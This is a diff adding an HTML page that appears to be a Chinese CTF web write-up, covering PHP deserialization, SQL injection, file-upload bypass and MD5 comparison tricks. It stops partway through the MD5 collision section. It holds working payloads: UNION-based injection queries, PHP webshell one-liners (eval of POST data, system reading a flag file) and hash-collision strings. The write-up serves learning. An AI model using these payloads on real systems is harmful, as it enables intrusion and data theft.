@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.80.0 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Zor01478">
+<meta name="keywords" content="CTF, C/C&#43;&#43;, PHP, Java, 渗透">
+<meta name="description" content="
+ACTF Web WP
+">
+
+
+<meta property="og:description" content="
+ACTF Web WP
+">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACTF Web WP">
+<meta name="twitter:title" content="ACTF Web WP">
+<meta property="og:url" content="https://Zor01478.github.io/2021/02/actf-web-wp/">
+<meta property="twitter:url" content="https://Zor01478.github.io/2021/02/actf-web-wp/">
+<meta property="og:site_name" content="戴头盔的招财">
+<meta property="og:description" content="
+ACTF Web WP
+">
+<meta name="twitter:description" content="
+ACTF Web WP
+">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2021-02-21T10:29:25">
+  
+  
+    <meta property="article:modified_time" content="2021-02-21T10:29:25">
+  
+  
+  
+    
+      <meta property="article:section" content="招财渗透屋">
+    
+  
+  
+    
+      <meta property="article:tag" content="ACTF">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/suolue2.png">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/suolue2.png">
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/fengmian2.jpg">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/fengmian2.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+  <meta property="twitter:image" content="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+
+
+    <title>ACTF Web WP</title>
+
+    <link rel="icon" href="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+    
+
+    
+
+    <link rel="canonical" href="https://Zor01478.github.io/2021/02/actf-web-wp/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://Zor01478.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://Zor01478.github.io/">戴头盔的招财</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://Zor01478.github.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://Zor01478.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">Zor01478</h4>
+        
+          <h5 class="sidebar-profile-bio">戴了头盔，所以头很铁</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">类别</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/Zor01478" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              post-header-cover--full"
+       style="background-image:url('/images/fengmian2.jpg')"
+       data-behavior="5">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title" itemprop="headline">
+      ACTF Web WP
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-02-21T10:29:25&#43;08:00">
+        
+  二月 21, 2021
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://Zor01478.github.io/categories/%e6%8b%9b%e8%b4%a2%e6%b8%97%e9%80%8f%e5%b1%8b">招财渗透屋</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="5"
+        class="hasCover
+               hasCoverMetaIn
+               hasCoverCaption">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+            <span class="post-header-cover-caption caption">雪国的樱花</span>
+          
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <blockquote>
+<p>ACTF Web WP</p>
+</blockquote>
+<!-- raw HTML omitted -->
+<ul>
+<li><a href="#actf-web-wp">ACTF Web WP</a>
+<ul>
+<li><a href="#baby_serialize">baby_serialize</a>
+<ul>
+<li><a href="#0x01-%E5%88%86%E6%9E%90">0x01 分析</a></li>
+<li><a href="#0x02-%E8%A7%A3%E9%A2%98">0x02 解题</a></li>
+</ul>
+</li>
+<li><a href="#sqli">sqli</a>
+<ul>
+<li><a href="#0x01-%E5%88%86%E6%9E%90--%E8%A7%A3%E9%A2%98">0x01 分析 &amp; 解题</a></li>
+</ul>
+</li>
+<li><a href="#linkgame">linkgame</a></li>
+<li><a href="#upload">Upload</a>
+<ul>
+<li><a href="#0x01-%E5%88%86%E6%9E%90-1">0x01 分析</a></li>
+<li><a href="#0x02-%E8%A7%A3%E9%A2%98-1">0x02 解题</a></li>
+<li><a href="#0x03-%E6%8B%93%E5%B1%95">0x03 拓展</a></li>
+</ul>
+</li>
+<li><a href="#php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">php代码审计</a>
+<ul>
+<li><a href="#0x01-%E5%88%86%E6%9E%90-2">0x01 分析</a></li>
+<li><a href="#0x02-%E8%A7%A3%E9%A2%98-2">0x02 解题</a></li>
+<li><a href="#0x03-%E6%8B%93%E5%B1%95-1">0x03 拓展</a></li>
+</ul>
+</li>
+<li><a href="#do_you_like_pythonssti">Do_You_like_Python?(SSTI)</a>
+<ul>
+<li><a href="#0x01-%E5%88%86%E6%9E%90-3">0x01 分析</a></li>
+<li><a href="#0x02-%E8%A7%A3%E9%A2%98-3">0x02 解题</a></li>
+</ul>
+</li>
+<li><a href="#xss">XSS</a></li>
+<li><a href="#ssrf">SSRF</a>
+<ul>
+<li><a href="#0x01-%E5%88%86%E6%9E%90--%E8%A7%A3%E9%A2%98-1">0x01 分析 &amp; 解题</a></li>
+</ul>
+</li>
+<li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">命令执行</a>
+<ul>
+<li><a href="#0x01-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--%E8%A7%A3%E9%A2%98">0x01 命令执行 &amp; 解题</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<h2 id="actf-web-wp">ACTF Web WP</h2>
+<hr>
+<h3 id="baby_serialize">baby_serialize</h3>
+<h4 id="0x01-分析">0x01 分析</h4>
+<ul>
+<li>
+<p>一道PHP相关的反序列化题目</p>
+</li>
+<li>
+<p>涉及知识点</p>
+<ul>
+<li>反序列化</li>
+<li>类修饰符序列化后的区别(public / protected / private)</li>
+</ul>
+</li>
+<li>
+<p>题目源码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+<span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{
+    <span style="color:#66d9ef">private</span> $Username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0xDktb&#34;</span>;
+    <span style="color:#66d9ef">private</span> $Password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0xDktb111&#34;</span>;
+
+    <span style="color:#66d9ef">function</span> __construct(){
+        $Username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0xDktb&#34;</span>;
+        $Password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0xDktb123&#34;</span>;
+    }
+
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isAdmin</span>(){
+        <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Username</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>){
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+        }
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+    }
+
+    <span style="color:#66d9ef">function</span> __destruct(){
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Hello &#34;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Username</span>;
+    }
+}
+
+$user <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>();
+
+<span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#39;user&#39;</span>]){
+    $user <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_GET[<span style="color:#e6db74">&#39;user&#39;</span>]); <span style="color:#75715e">// 反序列化会调用析构函数
+</span><span style="color:#75715e"></span>}
+
+<span style="color:#66d9ef">if</span>($user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isAdmin</span>()){    <span style="color:#75715e">// 构造一个序列化后的类admin就行
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> $flag;
+}
+<span style="color:#f92672">?</span>
+</code></pre></div></li>
+</ul>
+<h4 id="0x02-解题">0x02 解题</h4>
+<ul>
+<li>
+<p>构造一个类并将其序列化</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{
+    <span style="color:#66d9ef">private</span> $Username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>;
+    <span style="color:#66d9ef">private</span> $Password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag&#34;</span>;
+}
+
+$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>();
+$b <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($a);
+
+<span style="color:#66d9ef">echo</span> $b;
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div></li>
+<li>
+<p><strong>payload：</strong> ?user=O:4:&ldquo;User&rdquo;:2:{s:14:&quot;%00User%00Username&quot;;s:5:&ldquo;admin&rdquo;;s:14:&quot;%00User%00Password&quot;;s:4:&ldquo;flag&rdquo;;}</p>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/ACTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601.png" alt=""></p>
+</li>
+</ul>
+<hr>
+<h3 id="sqli">sqli</h3>
+<h4 id="0x01-分析--解题">0x01 分析 &amp; 解题</h4>
+<ul>
+<li>
+<p>涉及知识点：字符型注入</p>
+</li>
+<li>
+<p>有回显，直接爆就完事了</p>
+</li>
+<li>
+<p>payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">//</span> <span style="color:#e6db74">&#39; 单引号字符型注入
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">order</span> <span style="color:#66d9ef">by</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span> <span style="color:#f92672">#</span>  <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">判断回显列</span>
+
+<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; union select 1,database(),3 # //查看当前库
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">-1&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">version</span>(),<span style="color:#ae81ff">3</span> <span style="color:#f92672">#</span> <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">查看数据库版本</span>
+
+<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; union select 1,group_concat(table_name),2333 from information_schema.tables where table_schema=database() #  //查看所有的表名
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">-1&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,group_concat(<span style="color:#66d9ef">column_name</span>),<span style="color:#ae81ff">2333</span> <span style="color:#66d9ef">from</span> information_schema.columns <span style="color:#66d9ef">where</span> table_schema<span style="color:#f92672">=</span><span style="color:#66d9ef">database</span>() <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">table_name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;f1Ag&#39;</span> <span style="color:#f92672">#</span>  <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">查看指定库指定表的所有列</span>
+
+<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; union select 1,flag, 2333 from f1Ag #  //查看f1Ag表中的flag字段
+</span></code></pre></div></li>
+<li>
+<p>题目源码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;SELECT * FROM users where id=&#39;&#34;</span> <span style="color:#f92672">.</span> $_POST[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
+
+<span style="color:#66d9ef">while</span>($row <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_fetch_array</span>($result))
+{
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;用户名: &#34;</span> <span style="color:#f92672">.</span> $row[<span style="color:#e6db74">&#39;username&#39;</span>];
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br /&gt;&#34;</span>;
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;密码: &#34;</span> <span style="color:#f92672">.</span> $row[<span style="color:#e6db74">&#39;password&#39;</span>];
+}
+
+<span style="color:#a6e22e">mysql_close</span>($con);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/ACTFSQL01.png" alt=""></p>
+</li>
+</ul>
+<hr>
+<h3 id="linkgame">linkgame</h3>
+<ul>
+<li>没什么好写的，玩了一下bp抓包发送到repeater查看一下返回信息就能发现flag</li>
+</ul>
+<hr>
+<h3 id="upload">Upload</h3>
+<h4 id="0x01-分析-1">0x01 分析</h4>
+<ul>
+<li>
+<p>一个文件上传漏洞的题目</p>
+</li>
+<li>
+<p>先传了个php文件失败，传个图片格式的发现成功</p>
+</li>
+<li>
+<p>试了下各种后缀绕过：大小写，复写&hellip;反正是都失败了</p>
+</li>
+<li>
+<p>先抓个包康康</p>
+<ul>
+<li>请求Header中Content-Type：multipart/form-data（表示该请求是一个文件上传请求）</li>
+<li>存在boundary字符串（作用为分隔符，以区分POST数据）</li>
+<li>POST的内容有以下特征
+<ul>
+<li>Content-Disposition</li>
+<li>name</li>
+<li>filename</li>
+</ul>
+</li>
+<li>POST中的boundary的值就是Content-Type的值在最前面加了两个<code>--</code>，除了最后标识结束的boundary</li>
+<li>最后标识结束的boundary末尾默认会多出两个<code>--</code>
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/ACTFUpload01.png" alt=""></li>
+<li>// 在filename =  加了个空格，显示出了源码（或者补全index.php）</li>
+</ul>
+</li>
+<li>
+<p>大概解析步骤如下</p>
+<ul>
+<li>获取Request Header里的Content-Type中获取<code>boundary值</code></li>
+<li>根据第一步的boundary值，解析POST数据，获取文件名</li>
+<li>判断文件名是否在拦截黑名单内</li>
+</ul>
+</li>
+<li>
+<p>题目源码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>]))
+    {   <span style="color:#75715e">// 白名单和限制大小
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span>(($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;type&#34;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;image/jpeg&#34;</span>
+        <span style="color:#f92672">||</span> $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;type&#34;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;image/jpg&#34;</span>
+        <span style="color:#f92672">||</span> $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;type&#34;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;image/gif&#34;</span>
+        <span style="color:#f92672">||</span> $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;type&#34;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;image/png&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;size&#34;</span>] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000000</span>)
+        {
+            <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>], <span style="color:#e6db74">&#34;upload/&#34;</span><span style="color:#f92672">.</span>$_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]);
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;upload success!&#34;</span>;
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br/&gt;&#34;</span>;
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;The file is in upload/&#34;</span><span style="color:#f92672">.</span>$_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>];
+        }<span style="color:#66d9ef">else</span>{
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;upload error!&#34;</span>;
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br/&gt;&#34;</span>;
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Please check the file type and size&#34;</span>;
+        }
+    }<span style="color:#66d9ef">else</span>{
+        <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+    }
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div></li>
+</ul>
+<h4 id="0x02-解题-1">0x02 解题</h4>
+<ul>
+<li>
+<p>获取文件名的地方在<code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;</code>和<code>Content-Type</code>里，所以要绕过只能在这了</p>
+<ul>
+<li>去掉引号</li>
+<li>单双引号替换</li>
+<li>大小写</li>
+<li>在filename=后面加空格</li>
+<li>去掉或修改Content-Disposition值，例如去掉form-data</li>
+<li>交换name / filename的顺序</li>
+<li>去掉或修改Content-Disposition值</li>
+<li>多个filename，多个分号，filename换行</li>
+</ul>
+</li>
+<li>
+<p>所以将Content-Type的值改为白名单的值就行</p>
+</li>
+<li>
+<p>payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">// Content-Type: image/jpeg
+</span><span style="color:#75715e">// 上传的test.php(一句话木马)
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;php&#34;</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#a6e22e">shell</span>]);<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>    <span style="color:#75715e">// 用蚁剑连接找flag
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;shell&#39;</span>]);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">   // 同上，上面的用来绕过&lt;?php 
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">or
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php @system(&#34;cat /flag.txt&#34;);?&gt;  // 直接获取也行
+</span></code></pre></div><p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/ACTFUpload02.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/ACTFUpload03.png" alt=""></p>
+</li>
+</ul>
+<h4 id="0x03-拓展">0x03 拓展</h4>
+<p>常见的WAF文件上传检测机制</p>
+<ul>
+<li>
+<p>文件名</p>
+<ul>
+<li>解析文件名，判断是否在黑名单内</li>
+</ul>
+</li>
+<li>
+<p>文件内容</p>
+<ul>
+<li>解析文件内容，判断是否为webshell</li>
+<li>文件目录权限</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="php代码审计">php代码审计</h3>
+<h4 id="0x01-分析-2">0x01 分析</h4>
+<ul>
+<li>
+<p>涉及知识点</p>
+<ul>
+<li>php弱类型比较</li>
+<li>MD5加密</li>
+<li>运算符优先级</li>
+</ul>
+</li>
+<li>
+<p><code>==</code>只是对值进行比较（将两边值转化为同类型再比较），而<code>===</code>则是对值和类型的比较</p>
+</li>
+<li>
+<p>对于<code>==</code>的比较，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较</p>
+</li>
+<li>
+<p>and    &amp;    &amp;&amp;    or    |    ||  之间的关系</p>
+<ul>
+<li>在PHP中，&amp;&amp;与and都表示逻辑与，||与or都表示逻辑或，均是短路运算符</li>
+<li><strong>赋值运算的优先级比AND和OR的高，所以先赋值</strong></li>
+<li>比&amp;&amp;和||的低，所以逻辑运算符先执行，先逻辑运算，再赋值</li>
+<li><strong>&amp; 位运算和逻辑运算，作为逻辑运算时：左右两边的条件都会进行运行计算，均为真才为真【左右都运行】</strong></li>
+<li><strong>&amp;&amp; 逻辑运算，只要左端条件式为假直接不成立，不会去判断右端条件式</strong></li>
+<li><code>$a AND $b</code> 和 <code>$a &amp;&amp; $b</code> 没有任何区别</li>
+</ul>
+</li>
+<li>
+<p>MD5 常见的绕过思路</p>
+<ul>
+<li>
+<p>常规的0e绕过 (弱类型比较：<code>$c==md5($c)</code>)</p>
+<ul>
+<li>QNKCDZO</li>
+<li>240610708</li>
+<li>s878926199a</li>
+<li>s155964671a</li>
+<li>s214587387a</li>
+<li>s214587387a</li>
+<li>0e215962017</li>
+</ul>
+</li>
+<li>
+<p>数组绕过(<code>md5($_GET['a']) == md5($_GET['b'])</code>)</p>
+<ul>
+<li><code>a[]=a&amp;b[]=b</code> // 虽然会报错，但是判断为真</li>
+</ul>
+</li>
+<li>
+<p>强类型绕过(哈希碰撞)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>((<span style="color:#a6e22e">string</span>)$_POST[<span style="color:#e6db74">&#39;a&#39;</span>] <span style="color:#f92672">!==</span> (<span style="color:#a6e22e">string</span>)$_POST[<span style="color:#e6db74">&#39;b&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;a&#39;</span>]) <span style="color:#f92672">===</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;b&#39;</span>]))
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#75715e">// 一些MD5值相等的字符串，用于绕过MD5强类型比较
+</span><span style="color:#75715e"></span>
+$md5_test1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&#34;</span>;
+$md5_test2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&#34;</span>;
+
+$md5_test3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2</span><span style="color:#e6db74">&#34;</span>;
